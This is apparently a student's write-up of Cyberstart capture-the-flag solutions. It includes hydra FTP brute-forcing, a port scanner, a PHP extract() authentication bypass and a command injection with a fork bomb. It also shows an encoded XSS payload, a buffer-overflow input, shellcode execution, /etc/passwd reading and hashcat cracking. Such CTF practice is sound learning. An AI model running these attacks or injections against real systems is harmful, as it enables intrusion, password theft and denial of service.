### Headquarters Base- Cyberstart

Here's a basic overview of how I got the solutions to the tougher Cyberstart Challenges.

#### Level 7

C11 - Secret Spreadsheet
Revstr

``` python
import urllib.request, urllib.error, urllib.parse

link = "http://www.chiquitooenterprise.com/password"

response = urllib.request.urlopen(link)
response = response.read()
#print(response)

x = (response.decode('utf-8'))
#print(x)

revString = x[::-1]
#print(revString)

answer = "http://www.chiquitooenterprise.com/password?code=" + revString
response = urllib.request.urlopen(answer)
response = response.read()
print(response.decode('utf-8'))

```

#### Level 8

W0088 - Konami code- type console.log() in console for it to listen, and then press the following keys: up, up, down, down, left, right, left, right, b, a. Flag was then revealed.

Hidra- 
first, crack the password with hydra:
$ hydra -l secure_user -P words.txt ftp://services.cyberprotection.agency -s 2121
yielded pw: mutineers
connect to ftp server:
ftp services.cyberprotection.agency 2121
after entering username and password, used ls to list files and "get FLAG.txt" to download the file.

#### Level 9 

C06 - Mission Extension

connect to server via ssh, and find image files with the following:
$ find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image'
Once I found the image, I had to exit the ssh connection to the server and establish an scp connection to download the file:

$ scp -P26041 9XtXpQhrht@54.229.163.112:./Contents/M5KDAN44 ~/

C09 
After connecting to the ssh server, $cd .. twice, then run the following command to find the file. 
$ find ./ -type f -ls | grep "Nov 22"
$ cat ./etc/protocol

C11
Uploading the images to aperisolve showed that one had a zip file in it. Extracted it with binwalk -e, which yielded an ELF named "msg". Running it gave the flag. 

C10: 
```python
import itertools
import os

numbers = '0123456789'
y = ''
for c in itertools.product(numbers, repeat = 4):
    pin = y+''.join(c)
    print(pin)
    os.system("./program-x86 " + pin)
```


#### Level 10

C03 - download the two files, then run this command:
$ diff locks locks_old | grep '^<' | cut -c 3-

C04- this one took forever. Had to use the hint, which suggested using GIMP. With some more googling and after trying lots of tools, I used the "Threshold" tool and manipulating that revealed the flag along the edge of the image.

C05
enter the server, then:
$man -K matryoshka

apparently could have used apropos

C06
php code was given:
```
<?php
$key = '';
extract($_GET);
if ($key !== $password) {
?>
  <div class="main">
    <div class="logo"><img src="../assets/images/challenge-chirp-logo.svg" alt="Chirp logo"></div>

    <form class="form" method="GET">
      <div class="message message-error" id="msg-incorrect" style="display: none">Wrong. No chirping today.</div>

      <div class="field">
        <div class="label">Username</div>

        <input type="text" name="username" id="username">
      </div>

      <div class="field">
        <div class="label">Password</div>

        <input type="password" name="password" id="password">
      </div>

      <div class="actions">
        <input type="submit" value="Enter" class="btn">
      </div>
    </form>
  </div>
<?php
} else {
    require_once("emails");
};
?>
```
so I input parameters "key" and "password" into the url 

C10 - spent way too much time on this. LOTS of things kept breaking. sigh. final solution:

```python
# pip install pycryptodome
from Crypto.Cipher import AES
import base64
import os
import string
words = open("words.txt", "r", encoding = "utf-8")
wordlist = words.read()
wordlist = wordlist.split()
BLOCK_SIZE = 32

PADDING = b'{'

# Encrypted text to decrypt
encrypted = "uqX82PBZ8pi1fvt4GLHYgLs50ht8OQlrR1KHL2teppQ="

DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)


for secret in wordlist:
    if secret[-1:] == "\n":
        print("Error, new line character at the end of the string. This will not match!")
    elif len(secret.encode('utf-8')) >= 32:
        print("Error, string too long. Must be less than 32 bytes.")
    else:
        # create a cipher object using the secret
        cipher = AES.new(secret.encode('utf-8') + (BLOCK_SIZE - len(secret.encode('utf-8')) % BLOCK_SIZE) * PADDING, AES.MODE_ECB)

        # decode the encoded string
        decoded = DecodeAES(cipher, encrypted)
        if (decoded.startswith(b'FLAG:')):
            print ("Success: ")
            print(secret)
            print (decoded)
            break
        else:
            print("Wrong")
       
```

C11 - extracted first image using binwalk -e, pw for zipfile was Vidanya_Das

C12 - downloaded an ELF and a wordlist, but none of the wordlist passwords matched exactly- the challenge hinted at using John the Ripper and changing the passwords slightly. So after a little googling, I ran:

$ chmod +x program-x86
$ john -wordlist="words.txt" -rules --stdout > john.txt 
$ $ ./program-x86 john.txt 


#### Level 11

C02 - had to find an open port between 14000 and 15000:

```python
import socket
import threading
import time

# function to scan ports and see which ports are open
def scan_port(port):
	# we will check port of server
	server = "services.cyberprotection.agency"
	server_ip = socket.gethostbyname(server)
	
	# print("server_ip = {}".format(server_ip))
	status = False

	# create instance of socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# connecting the host ip address and port
	try:
		s.connect((server_ip, port))
		status = True
	except:
		status = False

	if status:
		print("port {} is open".format(port))


start_time = time.time()

for i in range(14000, 15000):
	thread = threading.Thread(target=scan_port, args=[i])
	thread.start()

end_time = time.time()
print("To all scan all ports it took {} seconds".format(end_time-start_time))
```

C03 - 
```python

message = [81, 95, 33, 108, 95, 26, 103, 95, 95, 110, 99, 104, 97, 26, 91, 110, 26, 110, 98, 95, 26, 60, 91, 92, 91, 108, 111, 109, 101, 99, 26, 104, 99, 97, 98, 110, 93, 102, 111, 92, 26, 99, 104, 26, 70, 105, 104, 94, 105, 104, 26, 91, 110, 26, 43, 43, 106, 103, 26, 110, 98, 99, 109, 26, 95, 112, 95, 104, 99, 104, 97, 40]

for num in range(1, 10):
  x = ''.join(chr(i+num) for i in message)
  print(x)
```
C04 - password check was a simple comparison to passwords in strings of file,
so running this:
strings strings3-x86 | xargs -n 1 ./strings3-x86 

gave the flag.

C05 - the images to download wouldn't load, so it was clear there was probably a magic numbers problem. Inserting the first 4 bytes with the jpg magic numbers into the largest image file did the trick - I could open the image and the flag was printed on it.

C06 - had to write a script to post a session id to a URL, the right one was 78:

```python
import requests

URL = 'https://bondogge.com/createPost?'

file = open("data.txt", "w")

for x in range(1, 100):
    post_data = {"userID":24,
                 "sessID":x}
    data = requests.post(URL, post_data).text
    file.write(data)
file.close()
```
I opened data.txt to read the data, there was the flag.

C07- I first tried converting de4dc0de to decimal, but that didn't work. Octal did it.

$ ./program-x86 $(printf "00000000000000000\336\300\115\336") 
Also had to play around with the number of zeros to cause the buffer overflow because changing the number of zeroes changed the output.

#### Level 12
C04 - Change of Plan
This was actually really really really hard, and at the end of it I kept getting errors everytime I ran the code, BUT it outputted the flag nonetheless, so. Here's the code I was given:
```python
# pip install pycryptodome
from Crypto.Cipher import AES
import base64

BLOCK_SIZE = 32

PADDING = '{'

# Encrypted text to decrypt
encrypted = "xpd4OA7GZYDfn4lTMJW/EEqgp26BlgjxsTonc1Elcgo="

def decode_aes(c, e):
    return return c.decrypt(base64.b64decode(e)).decode('latin-1').rstrip(PADDING)

secret = "password"

if secret[-1:] == "\n":
    print("Error, new line character at the end of the string. This will not match!")
elif len(secret.encode('utf-8')) >= 32:
    print("Error, string too long. Must be less than 32 bytes.")
else:
    # create a cipher object using the secret
    cipher = AES.new(secret + (BLOCK_SIZE - len(secret.encode('utf-8')) % BLOCK_SIZE) * PADDING, AES.MODE_ECB)

    # decode the encoded string
    decoded = decode_aes(cipher, encrypted)

    if decoded != '':
        print('Decoded: '+decoded+"\n")
```

I had to modify it to work, which was the challenge, but I had to modify it a ton!

```python
# pip install pycryptodome
import string
from Crypto.Cipher import AES
import base64
import os

words = open("words.txt", "r", encoding = "utf-8")
wordlist = words.read()
wordlist = wordlist.split()
BLOCK_SIZE = 32

PADDING = b'{'

# Encrypted text to decrypt
encrypted = "xpd4OA7GZYDfn4lTMJW/EEqgp26BlgjxsTonc1Elcgo="

DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)


for i in wordlist:
    if (i[-1:] == "\n"):
        print("Error, new line character at the end of the string. This will not match!")
    elif len(i) >= 32:
        print("Error, string too long. Must be less than 32 bytes.")
    else:
        # create a cipher object using the secret
        cipher = AES.new(i.encode('utf-8') + (BLOCK_SIZE - len(i.encode('utf-8')) % BLOCK_SIZE) * PADDING, AES.MODE_ECB)

        # decode the encoded string
        decoded = DecodeAES(cipher, encrypted)
        try:
            decoded.decode('ascii')
        except UnicodeDecodeError:
            pass
        else:
            print(decoded)
```

C06

Had to use python2 to run this because I still get frustrated with the whole string, bytes issue thing:
```python
import socket

host = ("services.cyberprotection.agency", 9999)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(host)
data = s.recv(2048)
data = data.strip('\n')
data = data.split()

print(data)

num = (int(data[0]) * int(data[1]))/int(data[2])

s.send(str(num))

print(s.recv(2048))

s.close()
```

C08
Hand to inject: cryptonite -n; :(){ :|:& };: (fork bomb)

C10

This took me a little longer than it should have...I forgot to put the actual name of the cookie (timelock) in the code until much later:

```python
import requests
from bs4 import BeautifulSoup

# Fetch the HTML source
url = 'https://bulldoghax.com/secret/spinner'
response = requests.get(url)
htmlsource = response.text

# Use BeautifulSoup to extract the 'cookie' from the div with class 'number'
soup = BeautifulSoup(htmlsource, 'html.parser')
cookie = soup.find('div', {'class': 'number'}).text
print(cookie)

# Create a dictionary with the 'cookie' to send as a cookie in the POST request
cookies = {'timelock': cookie}  # Replace 'cookie_name' with the actual cookie name

# Make the POST request with the 'cookie'

post_url = 'https://bulldoghax.com/secret/codes'
response = requests.post(post_url, cookies=cookies)
# Print the response content
print(response.text)
```
C11
This one again took longer than it should have. I needed to insert this payload into the search box: <script>alert('Search this!!!')</script> but there were filters in place. I finally figured out to encode it with Hex(ascii) and then insert it, which gave me the flag.

#### Level 13
C3
connected to the server on netcat, it gave some strange output. so I moved the output to a file, it turned out to be a gzip file. gunzip wouldn't work, so I used 7z, and even though there were some errors it ended up unzipping and the resulting file had the flag.


C4- 
I'm pretry sure I didn't do this the way it was intended - we had to connect to a server and find a file - that was fairly obvious, the file was called "weird". It tried executing it, but it wanted the user to be called challenge011306.
I downloaded it to my machine, and then created a user called challenge011306 and executed it there, but I think I was supposed to do some binary patching?
C6

Strings don't give anything useful, though catting the file reveals r4ndOmd4t4isfun444all

C7
Executing this shellcode was a nightmare:

```
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char **argv) {
        const char shellcode[] = "\xeb\x3e\x58\x89\xc1\xbb\x00\x00\x00\x00\xba\x53\x00\x00\x00\x31\xc0\x8a\x04\x19\x53\x51\x50\x89\xe1\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x52\xba\x01\x00\x00\x00\xcd\x80\x5a\x59\x59\x5b\x43\x43\x4a\x75\xdb\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xbd\xff\xff\xff\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x5f\x69\x73\x5f\x64\x61\x74\x61\x5f\x64\x61\x74\x61\x5f\x69\x73\x5f\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65";
        int foo_value = 0;

        int (*foo)() = (int(*)())shellcode;
        foo_value = foo();

        printf("%d\n", foo_value);
}
```
Borrowed this code from a github site and tweaked it a little. Then ran this:

```
┌──(devina㉿kali)-[~/Downloads]
└─$ gcc -m32 -fno-stack-protector -z execstack main.c -o shell
```
Running the ELf outputted the flag!

C8
found the password list on the router site through 
$ (cat /etc/passwd)

Running it through hashcat:
$ hashcat -m 500 -a 0 hash.txt rockyou.txt --show
yielded:
$1$gaiiqAXv$UykKlBl6vUsgBc.rUiFk80:topcat

C09- Encrypted
Very complicated. Ran the program through radare2:

```
──(devina㉿kali)-[~/Downloads]
└─$ r2 ./program-x86
[0x08048340]> s main
[0x0804843b]> pdf
            ; DATA XREF from entry0 @ 0x8048357(r)
┌ 172: int main (char **argv);
│           ; var int32_t canary @ ebp-0xc
│           ; var int32_t var_10h @ ebp-0x10
│           ; var int32_t var_14h @ ebp-0x14
│           ; var int32_t var_18h @ ebp-0x18
│           ; var int32_t var_1ch @ ebp-0x1c
│           ; var int32_t var_20h @ ebp-0x20
│           ; var int32_t var_24h @ ebp-0x24
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_2ch @ ebp-0x2c
│           ; var int32_t var_30h @ ebp-0x30
│           ; var int32_t var_34h @ ebp-0x34
│           ; var int32_t var_38h @ ebp-0x38
│           ; var int32_t var_3ch @ ebp-0x3c
│           ; var int32_t var_40h @ ebp-0x40
│           ; var int32_t var_44h @ ebp-0x44
│           ; var char *var_48h @ ebp-0x48
│           ; var int32_t var_4ch @ ebp-0x4c
│           ; arg char **argv @ esp+0x64
│           0x0804843b      8d4c2404       lea ecx, [argv]
│           0x0804843f      83e4f0         and esp, 0xfffffff0
│           0x08048442      ff71fc         push dword [ecx - 4]
│           0x08048445      55             push ebp
│           0x08048446      89e5           mov ebp, esp
│           0x08048448      51             push ecx
│           0x08048449      83ec54         sub esp, 0x54
│           0x0804844c      89c8           mov eax, ecx
│           0x0804844e      8b4004         mov eax, dword [eax + 4]
│           0x08048451      8945b4         mov dword [var_4ch], eax
│           0x08048454      65a114000000   mov eax, dword gs:[0x14]
│           0x0804845a      8945f4         mov dword [canary], eax
│           0x0804845d      31c0           xor eax, eax
│           0x0804845f      c745b8708504.  mov dword [var_48h], str.swiCNJCtPVbCyyAmNG8PqFZsYpyXegEQRGt ; hit0_0                                                                                              
│                                                                      ; 0x8048570 ; "swi&CNJCtPVbCyyAmNG8PqFZsYpyXegEQRGt"                                                                                   
│           0x08048466      c745bc030000.  mov dword [var_44h], 3
│           0x0804846d      c745c0090000.  mov dword [var_40h], 9
│           0x08048474      c745c40e0000.  mov dword [var_3ch], 0xe    ; 14
│           0x0804847b      c745c8020000.  mov dword [var_38h], 2
│           0x08048482      c745cc090000.  mov dword [var_34h], 9
│           0x08048489      c745d0080000.  mov dword [var_30h], 8
│           0x08048490      c745d40b0000.  mov dword [var_2ch], 0xb    ; 11
│           0x08048497      c745d8150000.  mov dword [var_28h], 0x15   ; 21
│           0x0804849e      c745dc130000.  mov dword [var_24h], 0x13   ; 19
│           0x080484a5      c745e0030000.  mov dword [var_20h], 3
│           0x080484ac      c745e4010000.  mov dword [var_1ch], 1
│           0x080484b3      c745e8020000.  mov dword [var_18h], 2
│           0x080484ba      c745ec050000.  mov dword [var_14h], 5
│           0x080484c1      c745f0050000.  mov dword [var_10h], 5
│           0x080484c8      b800000000     mov eax, 0
│           0x080484cd      8b55f4         mov edx, dword [canary]
│           0x080484d0      653315140000.  xor edx, dword gs:[0x14]
│       ┌─< 0x080484d7      7405           je 0x80484de
│       │   0x080484d9      e832feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x80484d7(x)
│       └─> 0x080484de      83c454         add esp, 0x54
│           0x080484e1      59             pop ecx
│           0x080484e2      5d             pop ebp
│           0x080484e3      8d61fc         lea esp, [ecx - 4]
└           0x080484e6      c3             ret
[0x0804843b]> 

```
The encrypted string is followed by some variables with indexes into the string, so running this python script gave the flag:

```python
a = [0x03, 0x09, 0x0E, 0x02, 0x09, 0x08, 0x0B, 0x15, 0x13, 0x03, 0x01, 0x02, 0x05, 0x05]

s = "swi&CNJCtPVbCyyAmNG8PqFZsYpyXegEQRGt"

for v in a:
    print(s[v], end="")

print()
```
C10 - Connecting to the server gave this:

```
Pzmxizm bw jm kwvncaml!
(^_^)?
0n65 0n69 0n83
3840 / (22 - 7)
0j43 0j42 0j43
xrl=6875726E6763736E6F646B68796A737000000000000000000000000000000000
vi =6D617366666674766F726B6468797162
RZZ3BM6yfMWwrXG/RmLVQ7eYdlnsIMvlWjE4hOSiXRW4aKWVjbmMNWgLnFC6oIpu
```

The first few lines were easy enough to decrypt, but the first line was confusing, since rotating the letters gives "Hrepare to be confused!" and the tip they provided was "Decrypt all the things! Are you sure the first line is fully decrypted?". This was a very confusing tip, because it kept indicating that I had done it wrong, whereas the whole time the first letter not decrypting correctly was a clue to deselect the option to rotate upper characters for the final cipher on the last line.

Another trick was they rotated the letters for "key" and "iv", and I tried inputing the rotated numbers as well but had to use the numbers as given.

The last line, the cipher, went through multiple decryption layers: first, from ROT13 (lower case characters only), then from Base 64, then from AES, and lastly from Hex. Cyberchef was invaluable for this.

C11
There were a bunch of strings on the page- had to convert each one, find the one that converted to hexadecimal, enter the encoded (Base 64) version of it into the comment box, and then it outputed two strings that looked very similar, so I XORed them and that revealed the flag.
